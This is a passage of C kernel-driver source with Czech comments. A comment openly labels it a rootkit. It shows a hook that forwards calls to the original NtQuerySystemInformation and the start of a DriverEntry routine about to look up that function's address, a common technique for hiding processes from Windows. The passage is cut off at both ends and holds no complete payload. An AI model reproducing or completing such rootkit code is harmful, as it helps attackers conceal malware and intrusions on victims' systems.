    }

    // Volání původní funkce
    return originalNtQuerySystemInformation(SystemHandle, SystemInformationClass, SystemInformation, SystemInformationLength, SystemInformationLengthReturned);
}

// Funkce pro spuštění rootkitu (DriverEntry)
NTSTATUS DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath) {

    // Získání adresy původní funkce NtQuerySystemInformation
